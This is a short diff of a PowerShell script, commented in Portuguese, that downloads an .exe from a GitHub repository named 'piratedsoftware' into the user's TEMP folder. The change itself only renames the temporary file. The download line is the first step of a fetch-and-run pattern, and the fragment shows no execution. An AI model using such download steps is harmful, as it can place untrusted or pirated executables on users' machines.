@@ -6,7 +6,7 @@
 $url = "https://github.com/piratedsoftware/program1/blob/main/hello.exe"
 
 # Local onde o arquivo será salvo temporariamente
-$tempFile = "$env:TEMP\seu-arquivo.exe"
+$tempFile = "$env:TEMP\hello.exe"
 
 # Baixar o arquivo .exe
 Invoke-WebRequest -Uri $url -OutFile $tempFile
